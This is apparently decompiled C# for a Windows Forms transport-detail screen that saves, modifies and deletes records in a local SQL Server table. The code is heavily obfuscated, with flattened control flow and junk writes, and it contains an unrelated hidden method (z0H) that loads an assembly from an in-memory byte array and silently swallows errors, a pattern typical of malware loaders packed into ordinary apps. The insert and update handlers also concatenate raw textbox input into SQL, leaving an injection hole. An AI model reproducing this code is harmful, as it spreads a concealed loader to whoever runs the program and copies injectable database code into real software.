using System;
using System.ComponentModel;
using System.Data.SqlClient;
using System.Diagnostics;
using System.Drawing;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Bz5f;
using Microsoft.VisualBasic.CompilerServices;
using d3TQ;
using w0WN;

namespace g8J;

[DesignerGenerated]
public class w0A : Form
{
	private IContainer components;

	private string cs;

	private SqlConnection cn;

	private SqlCommand cmd;

	private SqlDataReader rd;

	internal virtual Button btnSave
	{
		[CompilerGenerated]
		get
		{
			return _btnSave;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = Jj3;
			Button val = _btnSave;
			if (val != null)
			{
				((Control)val).remove_Click(eventHandler);
			}
			_btnSave = value;
			val = _btnSave;
			Button obj = val;
			Hi84.char_0[555] = (char)((Hi84.char_0[555] + Tf67.byte_0[27]) & 'I');
			if (obj != null)
			{
				((Control)val).add_Click(eventHandler);
			}
		}
	}

	[field: AccessedThroughProperty("txtTid")]
	internal virtual TextBox txtTid
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label1")]
	internal virtual Label Label1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label2")]
	internal virtual Label Label2
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label3")]
	internal virtual Label Label3
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label4")]
	internal virtual Label Label4
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("txtTCost")]
	internal virtual TextBox txtTCost
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("txtTDistance")]
	internal virtual TextBox txtTDistance
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("txtTMode")]
	internal virtual TextBox txtTMode
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label5")]
	internal virtual Label Label5
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual Label Label6
	{
		[CompilerGenerated]
		get
		{
			return _Label6;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = Mx9;
			Label label = _Label6;
			if (label != null)
			{
				((Control)label).remove_Click(eventHandler);
			}
			_Label6 = value;
			label = _Label6;
			if (label != null)
			{
				((Control)label).add_Click(eventHandler);
			}
		}
	}

	internal virtual Label Label7
	{
		[CompilerGenerated]
		get
		{
			return _Label7;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = Ez5;
			Label label = _Label7;
			if (label != null)
			{
				((Control)label).remove_Click(eventHandler);
			}
			_Label7 = value;
			label = _Label7;
			if (label != null)
			{
				((Control)label).add_Click(eventHandler);
			}
		}
	}

	[field: AccessedThroughProperty("DataGridView1")]
	internal virtual DataGridView DataGridView1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual Button btnModify
	{
		[CompilerGenerated]
		get
		{
			return _btnModify;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = y7G;
			Button val = _btnModify;
			if (val != null)
			{
				((Control)val).remove_Click(eventHandler);
			}
			_btnModify = value;
			val = _btnModify;
			if (val != null)
			{
				((Control)val).add_Click(eventHandler);
			}
		}
	}

	internal virtual Button btnDelete
	{
		[CompilerGenerated]
		get
		{
			return _btnDelete;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = Cn0;
			Button val = _btnDelete;
			if (val != null)
			{
				((Control)val).remove_Click(eventHandler);
			}
			_btnDelete = value;
			val = _btnDelete;
			if (val != null)
			{
				((Control)val).add_Click(eventHandler);
			}
		}
	}

	public w0A()
	{
		//IL_002a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0034: Expected O, but got Unknown
		//IL_0035: Unknown result type (might be due to invalid IL or missing references)
		//IL_003f: Expected O, but got Unknown
		((Form)this).add_Load((EventHandler)Rd2);
		cs = "Data Source=DESKTOP-1L8UME0\\SQLEXPRESS;Initial Catalog=db_fabric;Integrated Security=True";
		cn = new SqlConnection(cs);
		cmd = new SqlCommand();
		Gj8();
	}

	[DebuggerNonUserCode]
	protected override void Kb8(bool a6P)
	{
		try
		{
			Hi84.char_0[585] = (char)((Hi84.char_0[585] * Hi84.char_0[317]) & '¬');
			if (a6P && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(a6P);
		}
	}

	[DebuggerStepThrough]
	private void Gj8()
	{
		//IL_0174: Unknown result type (might be due to invalid IL or missing references)
		//IL_017e: Expected O, but got Unknown
		//IL_0230: Unknown result type (might be due to invalid IL or missing references)
		//IL_023a: Expected O, but got Unknown
		//IL_0621: Unknown result type (might be due to invalid IL or missing references)
		//IL_062b: Expected O, but got Unknown
		//IL_062c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0636: Expected O, but got Unknown
		//IL_0637: Unknown result type (might be due to invalid IL or missing references)
		//IL_0641: Expected O, but got Unknown
		//IL_0647: Unknown result type (might be due to invalid IL or missing references)
		//IL_0651: Expected O, but got Unknown
		//IL_0652: Unknown result type (might be due to invalid IL or missing references)
		//IL_065c: Expected O, but got Unknown
		//IL_065d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0667: Expected O, but got Unknown
		//IL_066d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0677: Expected O, but got Unknown
		//IL_0678: Unknown result type (might be due to invalid IL or missing references)
		//IL_0682: Expected O, but got Unknown
		//IL_0683: Unknown result type (might be due to invalid IL or missing references)
		//IL_068d: Expected O, but got Unknown
		//IL_0693: Unknown result type (might be due to invalid IL or missing references)
		//IL_069d: Expected O, but got Unknown
		//IL_069e: Unknown result type (might be due to invalid IL or missing references)
		//IL_06a8: Expected O, but got Unknown
		//IL_06ae: Unknown result type (might be due to invalid IL or missing references)
		//IL_06b8: Expected O, but got Unknown
		//IL_06bb: Unknown result type (might be due to invalid IL or missing references)
		//IL_06c5: Expected O, but got Unknown
		//IL_06c6: Unknown result type (might be due to invalid IL or missing references)
		//IL_06d0: Expected O, but got Unknown
		//IL_06d1: Unknown result type (might be due to invalid IL or missing references)
		//IL_06db: Expected O, but got Unknown
		//IL_0759: Unknown result type (might be due to invalid IL or missing references)
		//IL_0763: Expected O, but got Unknown
		char[] char_ = Hi84.char_0;
		int num = 4;
		while (true)
		{
			btnSave = new Button();
			txtTid = new TextBox();
			Label1 = new Label();
			num = 23;
			while (true)
			{
				Label2 = new Label();
				while (true)
				{
					Label3 = new Label();
					Label4 = new Label();
					num = 58;
					while (true)
					{
						txtTCost = new TextBox();
						txtTDistance = new TextBox();
						txtTMode = new TextBox();
						num = 56;
						while (true)
						{
							Label5 = new Label();
							Label6 = new Label();
							Label7 = new Label();
							num = 35;
							while (true)
							{
								DataGridView1 = new DataGridView();
								btnModify = new Button();
								btnDelete = new Button();
								num = 24;
								while (true)
								{
									((ISupportInitialize)DataGridView1).BeginInit();
									((Control)this).SuspendLayout();
									((Control)btnSave).set_Location(new Point(160, 202));
									num = 46;
									while (true)
									{
										((Control)btnSave).set_Name("btnSave");
										((Control)btnSave).set_Size(new Size(75, 23));
										num = 3;
										while (true)
										{
											((Control)btnSave).set_TabIndex(4);
											((ButtonBase)btnSave).set_Text("SAVE");
											num = 7;
											while (true)
											{
												((ButtonBase)btnSave).set_UseVisualStyleBackColor(true);
												((Control)txtTid).set_Location(new Point(173, 40));
												num = 11;
												while (true)
												{
													((Control)txtTid).set_Name("txtTid");
													((Control)txtTid).set_Size(new Size(100, 20));
													num = 32;
													while (true)
													{
														((Control)txtTid).set_TabIndex(0);
														Label1.set_AutoSize(true);
														num = 13;
														while (true)
														{
															((Control)Label1).set_ForeColor(Color.White);
															((Control)Label1).set_Location(new Point(58, 90));
															num = 26;
															while (true)
															{
																((Control)Label1).set_Name("Label1");
																((Control)Label1).set_Size(new Size(82, 13));
																num = 34;
																while (true)
																{
																	((Control)Label1).set_TabIndex(2);
																	Label1.set_Text("Transport Cost :");
																	num = 53;
																	while (true)
																	{
																		Label2.set_AutoSize(true);
																		((Control)Label2).set_ForeColor(Color.White);
																		num = 5;
																		while (true)
																		{
																			((Control)Label2).set_Location(new Point(58, 47));
																			((Control)Label2).set_Name("Label2");
																			num = 29;
																			while (true)
																			{
																				((Control)Label2).set_Size(new Size(70, 13));
																				((Control)Label2).set_TabIndex(3);
																				num = 43;
																				while (true)
																				{
																					Label2.set_Text("Transport Id :");
																					Label3.set_AutoSize(true);
																					num = 60;
																					while (true)
																					{
																						((Control)Label3).set_ForeColor(Color.White);
																						((Control)Label3).set_Location(new Point(46, 125));
																						num = 19;
																						while (true)
																						{
																							((Control)Label3).set_Name("Label3");
																							((Control)Label3).set_Size(new Size(103, 13));
																							num = 21;
																							while (true)
																							{
																								((Control)Label3).set_TabIndex(4);
																								Label3.set_Text("Transport Distance :");
																								num = 1;
																								while (true)
																								{
																									Label4.set_AutoSize(true);
																									((Control)Label4).set_ForeColor(Color.White);
																									num = 37;
																									while (true)
																									{
																										((Control)Label4).set_Location(new Point(46, 158));
																										((Control)Label4).set_Name("Label4");
																										num = 59;
																										while (true)
																										{
																											((Control)Label4).set_Size(new Size(88, 13));
																											((Control)Label4).set_TabIndex(5);
																											num = 44;
																											while (true)
																											{
																												Label4.set_Text("Transport Mode :");
																												((Control)txtTCost).set_Location(new Point(173, 83));
																												num = 20;
																												while (true)
																												{
																													((Control)txtTCost).set_Name("txtTCost");
																													((Control)txtTCost).set_Size(new Size(100, 20));
																													num = 2;
																													while (true)
																													{
																														((Control)txtTCost).set_TabIndex(1);
																														((Control)txtTDistance).set_Location(new Point(173, 125));
																														num = 40;
																														while (true)
																														{
																															((Control)txtTDistance).set_Name("txtTDistance");
																															((Control)txtTDistance).set_Size(new Size(100, 20));
																															num = 49;
																															while (true)
																															{
																																((Control)txtTDistance).set_TabIndex(2);
																																((Control)txtTMode).set_Location(new Point(173, 158));
																																num = 6;
																																while (true)
																																{
																																	((Control)txtTMode).set_Name("txtTMode");
																																	((Control)txtTMode).set_Size(new Size(100, 20));
																																	num = 38;
																																	while (true)
																																	{
																																		((Control)txtTMode).set_TabIndex(3);
																																		Label5.set_AutoSize(true);
																																		num = 18;
																																		while (true)
																																		{
																																			((Control)Label5).set_Font(new Font("Microsoft Sans Serif", 10f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
																																			num = 16;
																																			while (true)
																																			{
																																				((Control)Label5).set_ForeColor(Color.White);
																																				((Control)Label5).set_Location(new Point(341, 19));
																																				num = 47;
																																				while (true)
																																				{
																																					((Control)Label5).set_Name("Label5");
																																					((Control)Label5).set_Size(new Size(126, 17));
																																					num = 31;
																																					while (true)
																																					{
																																						((Control)Label5).set_TabIndex(8);
																																						Label5.set_Text("Transport Detail");
																																						num = 45;
																																						while (true)
																																						{
																																							Label6.set_AutoSize(true);
																																							((Control)Label6).set_BackColor(Color.Blue);
																																							num = 48;
																																							while (true)
																																							{
																																								((Control)Label6).set_Font(new Font("Microsoft Sans Serif", 10f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
																																								num = 39;
																																								while (true)
																																								{
																																									((Control)Label6).set_ForeColor(Color.White);
																																									((Control)Label6).set_Location(new Point(731, 19));
																																									switch (char_[350])
																																									{
																																									case '㾭':
																																										break;
																																									case '㾶':
																																										goto end_IL_000d;
																																									case '㾳':
																																										goto end_IL_0161;
																																									case '㾥':
																																										goto end_IL_0186;
																																									case '㾵':
																																										goto end_IL_01a7;
																																									case '㾖':
																																										goto end_IL_01c8;
																																									case '㾘':
																																										goto end_IL_01f1;
																																									case '㾬':
																																										goto end_IL_021d;
																																									case '㾌':
																																										goto end_IL_023f;
																																									case '㾷':
																																										goto end_IL_025c;
																																									case '㾮':
																																										goto end_IL_0285;
																																									case '㾈':
																																										goto end_IL_02af;
																																									case '㾚':
																																										goto end_IL_02d8;
																																									case '㾲':
																																										goto end_IL_0300;
																																									case '㿁':
																																										goto end_IL_0328;
																																									case '㾫':
																																										goto end_IL_0354;
																																									case '㾇':
																																										goto end_IL_0379;
																																									case '㾛':
																																										goto end_IL_03a5;
																																									case '㾙':
																																									case '㿃':
																																										goto end_IL_03c6;
																																									case '㿂':
																																										goto end_IL_03e6;
																																									case '㾱':
																																										goto end_IL_040f;
																																									case '㾣':
																																										goto end_IL_0438;
																																									case '㾋':
																																										goto end_IL_0459;
																																									case '㾻':
																																										goto end_IL_047e;
																																									case '㾨':
																																										goto end_IL_04a7;
																																									case '㾠':
																																										goto end_IL_04c7;
																																									case '㾓':
																																										goto end_IL_04e8;
																																									case '㾦':
																																										goto end_IL_0511;
																																									case '㾑':
																																										goto end_IL_053a;
																																									case '㾍':
																																										goto end_IL_0557;
																																									case '㾉':
																																										goto end_IL_0580;
																																									case '㾴':
																																										goto end_IL_05a8;
																																									case '㾞':
																																										goto end_IL_05c8;
																																									case '㾩':
																																										goto end_IL_05f0;
																																									case '㾾':
																																										goto end_IL_0620;
																																									case '㿀':
																																										goto end_IL_0646;
																																									case '㿅':
																																										goto end_IL_066c;
																																									case '㾝':
																																										goto end_IL_0692;
																																									default:
																																										goto end_IL_06ad;
																																									case '㾏':
																																										((Control)Label6).set_Name("Label6");
																																										((Control)Label6).set_Size(new Size(18, 17));
																																										num = 30;
																																										goto case '㾤';
																																									case '㾤':
																																										((Control)Label6).set_TabIndex(9);
																																										Label6.set_Text("X");
																																										num = 12;
																																										goto case '㾒';
																																									case '㾒':
																																										Label7.set_AutoSize(true);
																																										((Control)Label7).set_BackColor(Color.Blue);
																																										num = 28;
																																										goto case '㾢';
																																									case '㾢':
																																										((Control)Label7).set_Font(new Font("Microsoft Sans Serif", 10f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
																																										num = 8;
																																										goto case '㾎';
																																									case '㾎':
																																										((Control)Label7).set_ForeColor(Color.White);
																																										((Control)Label7).set_Location(new Point(39, 19));
																																										num = 25;
																																										goto case '㾟';
																																									case '㾟':
																																										((Control)Label7).set_Name("Label7");
																																										((Control)Label7).set_Size(new Size(92, 17));
																																										num = 33;
																																										goto case '㾧';
																																									case '㾧':
																																										((Control)Label7).set_TabIndex(7);
																																										Label7.set_Text("Go To Main");
																																										num = 62;
																																										goto case '㿄';
																																									case '㿄':
																																										DataGridView1.set_ColumnHeadersHeightSizeMode((DataGridViewColumnHeadersHeightSizeMode)2);
																																										((Control)DataGridView1).set_Location(new Point(32, 239));
																																										num = 51;
																																										goto case '㾹';
																																									case '㾹':
																																										((Control)DataGridView1).set_Name("DataGridView1");
																																										((Control)DataGridView1).set_Size(new Size(599, 199));
																																										num = 14;
																																										goto case '㾔';
																																									case '㾔':
																																										((Control)DataGridView1).set_TabIndex(10);
																																										((Control)btnModify).set_Location(new Point(268, 202));
																																										num = 15;
																																										goto case '㾕';
																																									case '㾕':
																																										((Control)btnModify).set_Name("btnModify");
																																										((Control)btnModify).set_Size(new Size(75, 23));
																																										num = 52;
																																										goto case '㾺';
																																									case '㾺':
																																										((Control)btnModify).set_TabIndex(5);
																																										((ButtonBase)btnModify).set_Text("MODIFY");
																																										num = 17;
																																										goto case '㾗';
																																									case '㾗':
																																									case '㾼':
																																										((ButtonBase)btnModify).set_UseVisualStyleBackColor(true);
																																										((Control)btnDelete).set_Location(new Point(380, 202));
																																										num = 64;
																																										goto case '㿆';
																																									case '㿆':
																																										((Control)btnDelete).set_Name("btnDelete");
																																										((Control)btnDelete).set_Size(new Size(75, 23));
																																										num = 57;
																																										goto case '㾿';
																																									case '㾿':
																																										((Control)btnDelete).set_TabIndex(6);
																																										((ButtonBase)btnDelete).set_Text("DELETE");
																																										num = 67;
																																										goto case '㿉';
																																									case '㿉':
																																										((ButtonBase)btnDelete).set_UseVisualStyleBackColor(true);
																																										((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
																																										num = 66;
																																										goto case '㿈';
																																									case '㿈':
																																										((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
																																										((Form)this).set_BackColor(Color.FromArgb(0, 0, 64));
																																										num = 65;
																																										goto case '㿇';
																																									case '㿇':
																																										((Form)this).set_ClientSize(new Size(800, 450));
																																										((Control)this).get_Controls().Add((Control)(object)btnDelete);
																																										num = 0;
																																										goto case '㾆';
																																									case '㾆':
																																										((Control)this).get_Controls().Add((Control)(object)btnModify);
																																										((Control)this).get_Controls().Add((Control)(object)DataGridView1);
																																										num = 41;
																																										goto case '㾯';
																																									case '㾯':
																																										((Control)this).get_Controls().Add((Control)(object)Label6);
																																										((Control)this).get_Controls().Add((Control)(object)Label7);
																																										num = 55;
																																										goto case '㾽';
																																									case '㾽':
																																										((Control)this).get_Controls().Add((Control)(object)Label5);
																																										((Control)this).get_Controls().Add((Control)(object)txtTMode);
																																										num = 50;
																																										goto case '㾸';
																																									case '㾸':
																																										((Control)this).get_Controls().Add((Control)(object)txtTDistance);
																																										((Control)this).get_Controls().Add((Control)(object)txtTCost);
																																										num = 42;
																																										goto case '㾰';
																																									case '㾰':
																																										((Control)this).get_Controls().Add((Control)(object)Label4);
																																										((Control)this).get_Controls().Add((Control)(object)Label3);
																																										num = 36;
																																										goto case '㾪';
																																									case '㾪':
																																										((Control)this).get_Controls().Add((Control)(object)Label2);
																																										((Control)this).get_Controls().Add((Control)(object)Label1);
																																										num = 10;
																																										goto case '㾐';
																																									case '㾐':
																																										((Control)this).get_Controls().Add((Control)(object)txtTid);
																																										((Control)this).get_Controls().Add((Control)(object)btnSave);
																																										num = 68;
																																										goto case '㿊';
																																									case '㿊':
																																										((Form)this).set_FormBorderStyle((FormBorderStyle)0);
																																										((Control)this).set_Name("frmTransportDetail");
																																										((Form)this).set_StartPosition((FormStartPosition)1);
																																										num = 27;
																																										goto case '㾡';
																																									case '㾡':
																																										((Form)this).set_Text("frmTransportDetail");
																																										((ISupportInitialize)DataGridView1).EndInit();
																																										((Control)this).ResumeLayout(false);
																																										num = 22;
																																										goto case '㾜';
																																									case '㾜':
																																										((Control)this).PerformLayout();
																																										return;
																																									}
																																									continue;
																																									end_IL_000d:
																																									break;
																																								}
																																								continue;
																																								end_IL_0161:
																																								break;
																																							}
																																							continue;
																																							end_IL_0186:
																																							break;
																																						}
																																						continue;
																																						end_IL_01a7:
																																						break;
																																					}
																																					continue;
																																					end_IL_01c8:
																																					break;
																																				}
																																				continue;
																																				end_IL_01f1:
																																				break;
																																			}
																																			continue;
																																			end_IL_021d:
																																			break;
																																		}
																																		continue;
																																		end_IL_023f:
																																		break;
																																	}
																																	continue;
																																	end_IL_025c:
																																	break;
																																}
																																continue;
																																end_IL_0285:
																																break;
																															}
																															continue;
																															end_IL_02af:
																															break;
																														}
																														continue;
																														end_IL_02d8:
																														break;
																													}
																													continue;
																													end_IL_0300:
																													break;
																												}
																												continue;
																												end_IL_0328:
																												break;
																											}
																											continue;
																											end_IL_0354:
																											break;
																										}
																										continue;
																										end_IL_0379:
																										break;
																									}
																									continue;
																									end_IL_03a5:
																									break;
																								}
																								continue;
																								end_IL_03c6:
																								break;
																							}
																							continue;
																							end_IL_03e6:
																							break;
																						}
																						continue;
																						end_IL_040f:
																						break;
																					}
																					continue;
																					end_IL_0438:
																					break;
																				}
																				continue;
																				end_IL_0459:
																				break;
																			}
																			continue;
																			end_IL_047e:
																			break;
																		}
																		continue;
																		end_IL_04a7:
																		break;
																	}
																	continue;
																	end_IL_04c7:
																	break;
																}
																continue;
																end_IL_04e8:
																break;
															}
															continue;
															end_IL_0511:
															break;
														}
														continue;
														end_IL_053a:
														break;
													}
													continue;
													end_IL_0557:
													break;
												}
												continue;
												end_IL_0580:
												break;
											}
											continue;
											end_IL_05a8:
											break;
										}
										continue;
										end_IL_05c8:
										break;
									}
									continue;
									end_IL_05f0:
									break;
								}
								continue;
								end_IL_0620:
								break;
							}
							continue;
							end_IL_0646:
							break;
						}
						continue;
						end_IL_066c:
						break;
					}
					continue;
					end_IL_0692:
					break;
				}
				continue;
				end_IL_06ad:
				break;
			}
		}
	}

	private void Jj3(object sender, EventArgs e)
	{
		//IL_00af: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c4: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			cn.Open();
			cmd.set_Connection(cn);
			cmd.set_CommandText("insert into tbl_transport values(" + Conversions.ToString(Conversions.ToInteger(txtTid.get_Text())) + ",'" + txtTCost.get_Text() + "'," + txtTDistance.get_Text() + ",'" + txtTMode.get_Text() + "')");
			cmd.ExecuteReader();
			MessageBox.Show("Record Saved");
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			MessageBox.Show(ex2.ToString());
			ProjectData.ClearProjectError();
		}
		finally
		{
			cn.Close();
		}
		Fj4();
	}

	public void Fj4()
	{
		//IL_0154: Unknown result type (might be due to invalid IL or missing references)
		DataGridView1.get_Rows().Clear();
		DataGridView1.get_Columns().Clear();
		try
		{
			cn.Open();
			cmd.set_Connection(cn);
			cmd.set_CommandText("select * from tbl_transport");
			rd = cmd.ExecuteReader();
			DataGridView1.get_Columns().Add("c1", "Transport Id");
			DataGridView1.get_Columns().Add("c2", "Transport Cost");
			DataGridView1.get_Columns().Add("c3", "Transport Distance");
			DataGridView1.get_Columns().Add("c4", "Transport Mode");
			while (rd.Read())
			{
				DataGridView1.get_Rows().Add(new object[4]
				{
					rd.get_Item("transportid").ToString(),
					rd.get_Item("transportcost"),
					rd.get_Item("transportdistance").ToString(),
					rd.get_Item("transportmode")
				});
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			MessageBox.Show(ex2.ToString());
			ProjectData.ClearProjectError();
		}
		finally
		{
			cn.Close();
		}
	}

	private void Ez5(object sender, EventArgs e)
	{
		Hi84 hi = new Hi84();
		((Control)hi).Show();
		((Control)this).Hide();
	}

	private void Mx9(object sender, EventArgs e)
	{
		((Component)this).Dispose();
	}

	private void Rd2(object sender, EventArgs e)
	{
		Fj4();
	}

	private void y7G(object sender, EventArgs e)
	{
		//IL_00a6: Unknown result type (might be due to invalid IL or missing references)
		//IL_00bb: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			cn.Open();
			cmd.set_Connection(cn);
			cmd.set_CommandText("update tbl_transport set transportcost ='" + txtTCost.get_Text() + "',transportdistance=" + txtTDistance.get_Text() + ",transportmode='" + txtTMode.get_Text() + "' where transportid=" + Conversions.ToString(Conversions.ToInteger(txtTid.get_Text())));
			cmd.ExecuteReader();
			MessageBox.Show("Record Modified");
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			MessageBox.Show(ex2.ToString());
			ProjectData.ClearProjectError();
		}
		finally
		{
			cn.Close();
		}
		Fj4();
	}

	private void Cn0(object sender, EventArgs e)
	{
		//IL_0058: Unknown result type (might be due to invalid IL or missing references)
		//IL_006d: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			cn.Open();
			cmd.set_Connection(cn);
			cmd.set_CommandText("delete from tbl_transport where transportid=" + Conversions.ToString(Conversions.ToInteger(txtTid.get_Text())));
			cmd.ExecuteReader();
			MessageBox.Show("Record Deleted");
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			MessageBox.Show(ex2.ToString());
			ProjectData.ClearProjectError();
		}
		finally
		{
			cn.Close();
		}
		Fj4();
	}

	internal static bool z0H()
	{
		try
		{
			try
			{
				f5R4.mDic.Add(f5R4.T, Assembly.Load((byte[])f5R4.mDic[f5R4.mArray]).GetExportedTypes()[27]);
				return true;
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
		return false;
	}
}
